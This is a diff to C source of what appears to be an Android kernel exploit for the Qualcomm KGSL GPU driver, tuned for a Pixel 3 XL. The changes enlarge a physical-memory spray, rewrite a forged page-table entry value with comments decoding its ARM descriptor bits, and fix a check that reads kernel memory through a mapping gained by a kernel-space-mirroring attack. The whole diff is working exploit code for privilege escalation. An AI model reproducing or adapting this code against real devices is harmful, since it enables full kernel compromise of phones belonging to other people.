@@ -114,7 +114,7 @@ int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t
 
 // TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
 // increased this from 1G to 2G for Pixel 3 XL
-#define NPBUFS 128
+#define NPBUFS 192
 
 #define LEVEL1_SHIFT    30
 #define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)
@@ -295,7 +295,23 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     uint64_t tramp_pg_dir_phys = 0x80080000ull + 0x3806000ull - 0x1000ull;
     uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
     uint64_t tramp_pte_target = 0x80000000;
-    uint64_t tramp_pte_value = tramp_pte_target | 0x00e8000000000751ull;
+    // that page has 0x00e8000000000751, which is:
+    // https://developer.arm.com/documentation/101811/0104/Controlling-address-translation-Translation-table-format
+    // block descriptor (0b01 << 0)
+    // https://github.com/codingbelief/arm-architecture-reference-manual-for-armv8-a/blob/master/en/chapter_d4/d43_3_memory_attribute_fields_in_the_vmsav8-64_translation_table_formats_descriptors.md
+    // AttrIndx = 0b100 << 2 -> MAIR_EL0 [4] <- on v4.9 this is MT_NORMAL
+    // NS=0 <<5
+    // AP=0b01 << 6 - full access, https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/Virtual-Memory-System-Architecture--VMSA-/Memory-access-control/Access-permissions?lang=en
+    // SH=0b11 << 8
+    // AF=1 << 10
+    // nG=0
+    // DBM=1 << 51
+    // cont=0 << 52
+    // pxn=1 << 53 ??
+    // uxn=1 << 54
+    // nonSecure = 1 << 55
+    // so we want MT_NORMAL_NC, so 0xe800000000074d
+    uint64_t tramp_pte_value = tramp_pte_target | 0xe800000000074d;
 
     // from Adrenaline: spray physical memory
     /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
@@ -476,11 +492,11 @@ int main() {
         fprintf(stderr, "can't get GPU r/w\n");
         return 1;
     }
-    sleep(2);
+    sleep(5);
     // now check ksma...
     fprintf(stderr, "about to ksma...\n");
     void* ksma_mapping = (void*)(0xffffff8000000000ull + kKernelPageTableEntry * 0x40000000ull);
     uint32_t* mytarget = ksma_mapping + 0x80000 /* kernel */ + 0x38 /* kernel header magic: ARMd */;
-    fprintf(stderr, "%x\n", mytarget);
+    fprintf(stderr, "%x\n", *mytarget);
     return 0;
 }
